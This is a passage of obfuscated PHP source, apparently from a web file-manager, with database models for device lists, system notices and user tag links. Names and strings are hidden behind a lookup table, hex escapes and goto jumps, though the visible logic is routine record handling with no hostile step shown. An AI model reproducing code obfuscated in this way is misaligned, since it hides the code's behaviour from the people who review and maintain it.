($ââ¬óªˆ[$ÂŞø™¼[33]] == $ÂŞø™¼[629]) { $ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[1242]] = $ƒ›¬œË¦[$ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[1242]]]; $ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[1243]] = $ƒ›¬œË¦[$ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[1243]]]; } if ($ââ¬óªˆ[$ÂŞø™¼[33]] == $ÂŞø™¼[2213]) { $ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[193]] = $ƒ›¬œË¦[$ââ¬óªˆ[$ÂŞø™¼[535]][$ÂŞø™¼[193]]]; } if ($ââ¬óªˆ[$ÂŞø™¼[33]] == $ÂŞø™¼[1937]) { $ââ¬óªˆ[$ÂŞø™¼[2218]] = $ââ¬óªˆ[$ÂŞø™¼[90]]; $ââ¬óªˆ[$ÂŞø™¼[2202]] = $ââ¬óªˆ[$ÂŞø™¼[2218]][$ÂŞø™¼[193]]; $ââ¬óªˆ[$ÂŞø™¼[90]] = !1; $ââ¬óªˆ[$ÂŞø™¼[193]] = $ÂŞø™¼[12]; } $¾Ì£ü•° = array($ÂŞø™¼[1937], $ÂŞø™¼[2200]); if (!in_array($ââ¬óªˆ[$ÂŞø™¼[33]], $¾Ì£ü•°)) { if ($ââ¬óªˆ[$ÂŞø™¼[90]] && $ââ¬óªˆ[$ÂŞø™¼[90]][$ÂŞø™¼[190]] == $ÂŞø™¼[191]) { $´º×šõÖ[] = $•Öİ»¼[$ÂŞø™¼[484]]; unset($ø™±½¥ö[$¶¦è‚•Å]); continue; } if ($ââ¬óªˆ[$ÂŞø™¼[2218]] && $ââ¬óªˆ[$ÂŞø™¼[2218]][$ÂŞø™¼[190]] == $ÂŞø™¼[191]) { $´º×šõÖ[] = $•Öİ»¼[$ÂŞø™¼[484]]; unset($ø™±½¥ö[$¶¦è‚•Å]); continue; } } } $•Öİ»¼[$ÂŞø™¼[535]] = $ââ¬óªˆ; unset($•Öİ»¼[$ÂŞø™¼[2430]]); $¿†»¨õ[] = $•Öİ»¼; } $this->clearSystemPathLog($´º×šõÖ); return $¿†»¨õ; } private function clearSystemPathLog($­î·œ§ñ) { $èóëìÈª =& $_SERVER[ç¦¬”œš]; if (count($­î·œ§ñ) == 0) { return; } $•‹Æ‹ø = array($èóëìÈª[484] => array($èóëìÈª[7], array_unique($­î·œ§ñ))); $this->where($•‹Æ‹ø)->delete(); } public function deviceList($ûÍ‹‰½ö, $”›óœ²Û = 0) { $üİ·«Ç· =& $_SERVER[ç¦¬”œš]; $ô¡º„‰æ = array($üİ·«Ç·[1770] => $ûÍ‹‰½ö, $üİ·«Ç·[231] => array($üİ·«Ç·[1093], $”›óœ²Û), $üİ·«Ç·[33] => $üİ·«Ç·[1911]); $ÌÛø™¤î = array(); $ßòìĞÚ× = $this->field($üİ·«Ç·[2431])->where($ô¡º„‰æ)->order($üİ·«Ç·[2216])->limit(50)->select(); foreach ($ßòìĞÚ× as $ü¥ê¨Ä => $¤äöÅøù) { if ($ü¥ê¨Ä > 0 && abs($¤äöÅøù[$üİ·«Ç·[231]] - $ßòìĞÚ×[$ü¥ê¨Ä - 1][$üİ·«Ç·[231]]) < 5) { continue; } $µÌ“¬³ = json_decode($¤äöÅøù[$üİ·«Ç·[535]], !0); $¤äöÅøù[$üİ·«Ç·[2421]] = isset($µÌ“¬³[$üİ·«Ç·[2421]]) ? $µÌ“¬³[$üİ·«Ç·[2421]] : $üİ·«Ç·[12]; unset($µÌ“¬³[$üİ·«Ç·[2421]]); $Ö·×ËÔá = $this->deviceType($µÌ“¬³[$üİ·«Ç·[2205]]); if (isset($ÌÛø™¤î[$Ö·×ËÔá])) { continue; } $¤äöÅøù[$üİ·«Ç·[2425]] = IpLocation::get($¤äöÅøù[$üİ·«Ç·[2421]]); $¤äöÅøù[$üİ·«Ç·[535]] = $µÌ“¬³; $ÌÛø™¤î[$Ö·×ËÔá] = $¤äöÅøù; } return array_values($ÌÛø™¤î); } public function deviceType($ôŞÖäÔ‡) { return $ôŞÖäÔ‡; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x6e\157\164\151\143\x65\114\151\163\164"; public $field = array("\156\141\x6d\x65", "\143\x6f\156\x74\x65\156\164", "\x61\x75\164\x68", "\x6d\157\x64\145", "\x74\x69\x6d\145", "\164\171\x70\145", "\x6c\145\166\x65\154", "\x65\x6e\x61\142\154\145", "\x73\157\x72\164"); public function listData($àƒãÍŠó = false, $Æ­ûÖÆ¶ = "\x73\x6f\x72\164", $‡¼Ø²›Ø = false) { return parent::listData($àƒãÍŠó, $Æ­ûÖÆ¶, $‡¼Ø²›Ø); } public function add($Šƒó´Ë) { $³Ä¢ò =& $_SERVER[ç¦¬”œš]; $¨ªê¹Ñ¥ = time(); if ($Šƒó´Ë[$³Ä¢ò[16]] == $³Ä¢ò[2432]) { $¨ªê¹Ñ¥ = strtotime($Šƒó´Ë[$³Ä¢ò[206]]); } $Šƒó´Ë[$³Ä¢ò[206]] = $¨ªê¹Ñ¥; return parent::insert($Šƒó´Ë); } public function update($½ºçñæ¸, $ÎéÃ£ä‡) { $íÊ²©± =& $_SERVER[ç¦¬”œš]; $¤©®”Æ„ = $this->listData($½ºçñæ¸); if (!$¤©®”Æ„) { return !1; } $¥‰–‘°ı = time(); if ($ÎéÃ£ä‡[$íÊ²©±[16]] == $íÊ²©±[2432]) { $¥‰–‘°ı = strtotime($ÎéÃ£ä‡[$íÊ²©±[206]]); } $ÎéÃ£ä‡[$íÊ²©±[206]] = $¥‰–‘°ı; return parent::update($½ºçñæ¸, $ÎéÃ£ä‡); } public function remove($Êú±‚ãæ) { $“şè´ê† = $this->listData($Êú±‚ãæ); if (!$“şè´ê† || $“şè´ê†[$_SERVER[ç¦¬”œš][191]]) { return !1; } return parent::remove($Êú±‚ãæ); } public function sort($ Ã÷éŞà, $¨’ó¨®¥) { return parent::update($ Ã÷éŞà, $¨’ó¨®¥); } public function enable($ Ş––®, $¤†Ÿï¿) { return parent::update($ Ş––®, array($_SERVER[ç¦¬”œš][2433] => $¤†Ÿï¿)); } private function initUserOption() { $Ñ½î—ËØ =& $_SERVER[ç¦¬”œš]; $this->optionType = $Ñ½î—ËØ[2434]; $this->modelType = $Ñ½î—ËØ[2435]; $this->field = array($Ñ½î—ËØ[2436], $Ñ½î—ËØ[32], $Ñ½î—ËØ[206], $Ñ½î—ËØ[33], $Ñ½î—ËØ[2437], $Ñ½î—ËØ[830], $Ñ½î—ËØ[226]); } public function userNoticeGet($ ãİî©Å = false) { $this->initUserOption(); return parent::listData($ ãİî©Å, $_SERVER[ç¦¬”œš][484], !0); } public function userNoticeAdd($¯Õ†§) { $¤ı Œá =& $_SERVER[ç¦¬”œš]; $this->initUserOption(); $Şä¼¨”ñ = $this->findByKey($¤ı Œá[2436], $¯Õ†§[$¤ı Œá[484]]); if ($Şä¼¨”ñ) { return !0; } $ªå‚ø‹‹ = array($¤ı Œá[2436] => $¯Õ†§[$¤ı Œá[484]], $¤ı Œá[32] => $¯Õ†§[$¤ı Œá[32]], $¤ı Œá[206] => $¯Õ†§[$¤ı Œá[206]], $¤ı Œá[33] => isset($¯Õ†§[$¤ı Œá[33]]) ? $¯Õ†§[$¤ı Œá[33]] : 1, $¤ı Œá[2437] => isset($¯Õ†§[$¤ı Œá[2437]]) ? $¯Õ†§[$¤ı Œá[2437]] : 0, $¤ı Œá[830] => 0, $¤ı Œá[226] => 0); return parent::insert($ªå‚ø‹‹); } public function userNoticeEdit($Ä‹šÂÏ, $öÖ´¯Ô) { $this->initUserOption(); return parent::update($Ä‹šÂÏ, $öÖ´¯Ô); } } goto E¶™–ñ®´Ç; dô“†¾°´: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($ü£…Ê–ë) { $‡»‘ÙïÙ =& $_SERVER[ç¦¬”œš]; return array($‡»‘ÙïÙ[2084] => array($‡»‘ÙïÙ[2499] . USER_ID, $‡»‘ÙïÙ[2085])); } protected function listData() { $†çšÉ =& $_SERVER[ç¦¬”œš]; $İ•šœ­ª = array($†çšÉ[1761] => USER_ID, $†çšÉ[566] => array($†çšÉ[2088], 0)); $¡²Ìà´ï = $†çšÉ[2500]; $¹˜Ü¶®¤ = $this->field($¡²Ìà´ï)->where($İ•šœ­ª)->order($†çšÉ[2091])->select(); return $¹˜Ü¶®¤ ? $¹˜Ü¶®¤ : array(); } protected function addToTag($ùš¹ğı, $¼…‘Şë´) { $‘íş·ê‹ =& $_SERVER[ç¦¬”œš]; if (!Model($‘íş·ê‹[2235])->listData($¼…‘Şë´)) { return !1; } if (is_numeric($ùš¹ğı)) { $áÔ™é¦‚ = Model($‘íş·ê‹[904])->pathInfo($ùš¹ğı); if (!$áÔ™é¦‚) { return !1; } } else { $áÔ™é¦‚ = IO::infoSimple($ùš¹ğı); if (!$áÔ™é¦‚) { return !1; } $øÑì˜îš = $áÔ™é¦‚[$‘íş·ê‹[32]]; $ ÊÇò¦— = $áÔ™é¦‚[$‘íş·ê‹[33]]; if (isset($áÔ™é¦‚[$‘íş·ê‹[494]])) { $ ÊÇò¦— = $áÔ™é¦‚[$‘íş·ê‹[494]] == $‘íş·ê‹[91] ? $‘íş·ê‹[78] : $‘íş·ê‹[230]; } } $›ğŠì™ = array($‘íş·ê‹[1761] => USER_ID, $‘íş·ê‹[566] => $¼…‘Şë´, $‘íş·ê‹[504] => $ùš¹ğı, $‘íş·ê‹[505] => $ ÊÇò¦— ? $ ÊÇò¦— : $‘íş·ê‹[499], $‘íş·ê‹[503] => $øÑì˜îš ? $øÑì˜îš : $‘íş·ê‹[12], $‘íş·ê‹[1973] => 0); if ($this->where($›ğŠì™)->find()) { return !1; } return $this->add($›ğŠì™); } protected function removeFromTag($ñ†…•³, $ÓÀØÍ–) { $Î™Úñáç =& $_SERVER[ç¦¬”œš]; if (!Model($Î™Úñáç[2235])->listData($ÓÀØÍ–)) { return !1; } if (is_array($ñ†…•³)) { $ñ†…•³ = array($Î™Úñáç[7], $ñ†…•³); } $£´øà•½ = array($Î™Úñáç[1761] => USER_ID, $Î™Úñáç[566] => $ÓÀØÍ–, $Î™Úñáç[504] => $ñ†…•³); return $this->where($£´øà•½)->delete(); } protected function removeByTag($ïŞ¤ü¹•) { $ªÄèıêÑ =& $_SERVER[ç¦¬”œš]; if (!$ïŞ¤ü¹•) { return !1; } $Ï¨ŒË© = array($ªÄèıêÑ[1761] => USER_ID, $ªÄèıêÑ[566] => $ïŞ¤ü¹•); return $this->where($Ï¨ŒË©)->delete(); } protected function removeBySource($á’²±¶ş) { $êŸ½ˆÒ¹ =& $_SERVER[ç¦¬”œš]; if (is_array($á’²±¶ş)) { $á’²±¶ş = array($êŸ½ˆÒ¹[7], $á’²±¶ş); } $ŞİŸßÊ = array($êŸ½ˆÒ¹[1761] => USER_ID, $êŸ½ˆÒ¹[566] => array($êŸ½ˆÒ¹[1093], 0), $êŸ½ˆÒ¹[504] => $á’²±¶ş); return $this->where($ŞİŸßÊ)->delete(); } }